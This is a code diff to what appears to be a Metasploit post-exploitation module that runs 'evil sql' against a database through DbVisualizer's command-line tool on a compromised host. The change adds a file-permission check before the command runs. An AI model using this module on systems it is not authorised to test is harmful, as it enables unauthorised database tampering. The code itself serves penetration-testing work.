@@ -196,15 +196,28 @@ class Metasploit3 < Msf::Post
     error =false
     resp=''
     if file?(dbvis)==true
-      print_status("Trying to execute evil sql, it can take time ...")
-      args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
-      dbvis ="\"#{dbvis}\""
-      cmd = "#{dbvis} #{args}"
-      resp = cmd_exec(cmd)
-      vprint_line("")
-      vprint_status("#{resp}")
-      if resp =~ /denied|failed/i
+      can_exec = false
+      f = session.fs.file.stat(dbvis)
+      if f.uid == Process.euid
+       can_exec = true
+      else
+       if Process.groups.include?f.gid
+         can_exec = true
+       end
+      end
+      if can_exec == true
+        print_status("Trying to execute evil sql, it can take time ...")
+        args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
+        dbvis ="\"#{dbvis}\""
+        cmd = "#{dbvis} #{args}"
+        resp = cmd_exec(cmd)
+        vprint_line("")
+        vprint_status("#{resp}")
+        if resp =~ /denied|failed/i
           error = true
+        end
+      else
+         print_error("User doesn't have enough rights to execute dbviscmd, aborting")
       end
     else
       print_error("#{dbvis} is not a file")
